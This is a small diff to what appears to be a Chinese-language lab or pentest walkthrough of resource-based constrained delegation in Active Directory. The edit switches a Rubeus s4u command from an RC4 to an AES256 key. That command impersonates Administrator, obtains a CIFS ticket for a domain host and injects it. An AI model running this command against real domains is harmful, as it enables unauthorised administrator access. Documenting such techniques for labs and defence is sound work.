@@ -53,7 +53,7 @@ Get-ADComputer -Identity "EC2AMAZ-V903HM1" -Properties msDS-AllowedToActOnBehalf
 
 4) S4U2Self + S4U2Proxy 取得 Administrator → CIFS 的 TGS 並注入
 ```powershell
-.\Rubeus.exe s4u /user:EvilPC$ /rc4:<rc4_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
+.\Rubeus.exe s4u /user:EvilPC$ /aes256:<aes256_KEY> /impersonateuser:Administrator /msdsspn:cifs/EC2AMAZ-V903HM1.sme.local /domain:SME.LOCAL /ptt
 klist tickets
 ```
 
